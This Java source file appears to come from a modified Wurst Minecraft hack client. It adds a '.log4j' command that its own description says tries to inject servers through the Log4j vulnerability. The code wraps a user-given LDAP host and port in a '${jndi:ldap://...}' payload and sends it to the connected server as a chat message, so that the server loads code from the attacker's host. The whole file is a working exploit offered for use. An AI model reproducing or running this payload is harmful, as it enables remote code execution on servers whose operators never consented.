/*
 * Copyright (C) 2017 - 2019 | Wurst-Imperium | All rights reserved.
 * Modified by KrisTHL181 in 2025
 * 
 * This source code is subject to the terms of the GNU General Public
 * License, version 3. If a copy of the GPL was not distributed with this
 * file, You can obtain one at: https://www.gnu.org/licenses/gpl-3.0.txt
 */
package net.wurstclient.forge.commands;

import net.minecraft.network.play.client.CPacketChatMessage;
import net.wurstclient.forge.Command;

public final class Log4jCmd extends Command {
    public Log4jCmd() {
        super("log4j", "试图使用Log4j漏洞注入服务器. 注: 您需要先搭建好Log4j Class提供端", "语法: .log4j <LDAP IP> <LDAP端口>\n" + "警告: 此功能需要在聊天框中发送信息, 且无法检测是否成功.");
    }

    @Override
    public void call(String[] args) throws CmdException {
        if (args.length < 2)
            throw new CmdSyntaxError();
        else if (Integer.parseInt(args[2]) > 65536 || Integer.parseInt(args[2]) < 1) {
            throw new CmdSyntaxError("端口号必须>1且<65536.");
        } else {
            String host = String.valueOf(args[1]);
            String port = String.valueOf(args[2]);
            String payload = "${jndi:ldap://" + host + ":" + port + "}";
            CPacketChatMessage packet = new CPacketChatMessage(payload);
            mc.getConnection().sendPacket(packet);
        }
    }
}
